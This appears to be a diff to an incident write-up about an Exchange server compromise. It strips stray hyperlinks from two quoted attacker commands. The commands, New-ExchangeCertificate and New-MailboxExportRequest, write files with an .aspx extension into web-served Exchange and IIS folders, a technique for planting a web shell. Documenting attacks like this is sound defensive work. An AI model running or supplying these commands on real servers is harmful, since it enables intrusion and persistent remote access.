@@ -68,7 +68,7 @@ Moreover, once the malicious actor has downgraded the privilege of the Exchange 
 
 ```csharp
 ***New-ExchangeCertificate\n-GenerateRequest 'True' -RequestFile 'C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\blank.aspx>' -SubjectName 'System.Security.Cryptography.X509Certificates.X500DistinguishedName' -BinaryEncoded 'True' -DomainName ('xxxxx[.darksys.com](http://smo.gov.sa/)
-')\darksys.com[/darksys.com/](http://nsmo.sa/SMO-OU/SMO)
+')\darksys.com[/darksys.com/]
 xxxxx IT/Hamad\S-1-5-21-43453453453-435435345-1482027129-500\nRemote-PowerShell-Unknown\n10544***
 ```
 
@@ -113,7 +113,7 @@ New-MailboxExportRequest\n-Mailbox 'Hamad@xxxxx.darksys.com' -FilePath '\\\\loca
 
 ```csharp
 New-MailboxExportRequest\n-Mailbox 'Hamad@xxxxx[.darksys.com](http://smo.gov.sa/)
-' -FilePath '\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet\\p433zrwewrvmcv.aspx' -IncludeFolders ('#Drafts#') -ContentFilter 'Subject -eq 'rksgzvccymzrvmcv''\[nxxxxx.sa/xxxxx-OU/](http://nsmo.sa/SMO-OU/SMO)
+' -FilePath '\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet\\p433zrwewrvmcv.aspx' -IncludeFolders ('#Drafts#') -ContentFilter 'Subject -eq 'rksgzvccymzrvmcv''\[nxxxxx.sa/xxxxx-OU/]
 xxxxx Hamad A. Admin\S-1-5-21-43453453453-435435345-1482027129-500\nRemote-PowerShell-Unknown\n10544
 ```
 
